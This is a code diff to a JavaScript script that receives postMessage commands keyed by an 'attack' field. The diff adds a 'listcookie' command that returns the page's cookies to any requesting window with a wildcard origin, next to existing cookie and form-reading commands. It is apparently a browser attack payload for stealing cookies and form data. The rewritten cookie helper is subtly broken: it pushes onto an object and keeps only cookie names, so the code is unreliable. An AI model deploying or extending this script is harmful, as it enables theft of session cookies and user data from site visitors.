@@ -35,6 +35,14 @@ window.addEventListener('message', function (evt) {
     let date = new Date();
     date = `${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`;
     switch (evt.data.attack) {
+      case "listcookie":
+        evt.source.postMessage({
+          name: evt.data.arg,
+          value: getCookies(),
+          date: date
+        }, '*');
+      break;
+
       case "cookie":
         evt.source.postMessage({
           name: evt.data.arg,
@@ -71,15 +79,12 @@ function getCookie(name) {
   if (parts.length == 2) return parts.pop().split(";").shift();
 }
 
-function getCookies(names) {
-  let result = [];
-  if (!names) {
-    return;
-  }
-  for (let i=0; i < names.length; i++) {
-    result.push(names[i], getCookie(names[i]));
-  }
-  return result;
+function getCookies() {
+  return document.cookie.split(';').reduce((cookies, cookie) => {
+    const [ name, value ] = cookie.split('=').map(c => c.trim());
+    cookies.push(name);
+    return cookies;
+  }, {});  
 }
 
 function getForms(field, value) {
